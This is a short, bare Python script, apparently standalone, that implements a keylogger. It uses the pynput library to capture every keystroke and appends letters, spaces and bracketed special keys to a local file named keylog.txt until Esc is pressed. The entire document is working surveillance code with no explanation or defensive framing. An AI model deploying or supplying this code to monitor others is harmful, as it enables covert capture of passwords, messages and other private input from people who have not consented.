import pynput.keyboard

def on_key_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            with open("keylog.txt", "a") as f:
                f.write(" ")
        else:
            with open("keylog.txt", "a") as f:
                f.write("[" + str(key) + "]")

def on_key_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

with pynput.keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()
